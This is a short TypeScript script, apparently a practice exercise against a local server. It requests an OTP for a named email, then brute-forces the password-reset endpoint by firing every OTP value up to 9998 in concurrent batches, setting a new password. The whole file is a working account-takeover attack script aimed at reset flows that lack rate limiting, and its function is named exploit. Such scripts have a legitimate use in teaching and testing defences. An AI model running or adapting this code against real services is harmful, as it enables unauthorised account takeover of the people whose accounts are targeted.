import axios from "axios";

async function generateOTP() {
  try {
    const response = await axios.post("http://localhost:3000/generate-otp", {
      email: "papa@gmail.com",
    });

    // You can use the response data as needed
    console.log("OTP generated for duniya ka papa:", response.data);
  } catch (error) {
    console.error("Error generating OTP:", error);
  }
}

generateOTP();

async function exploit(otp: number) {
  try {
    // console.log("now hacking the password:")
    const response = await axios.post("http://localhost:3000/reset-password", {
      email: "papa@gmail.com",
      otp: otp.toString(),
      newPassword: "duniya ka papa",
    });
    // console.log("running exploit function....");
  } catch (error) {}
}

async function main() {
  for (let i = 0; i < 9999; i += 100) {
    const promises = [];
    console.log("here for " + i);
    for (let j = 0; j < 100; j++) {
      promises.push(exploit(i + j));
    }
    await Promise.all(promises);
  }
}

main();
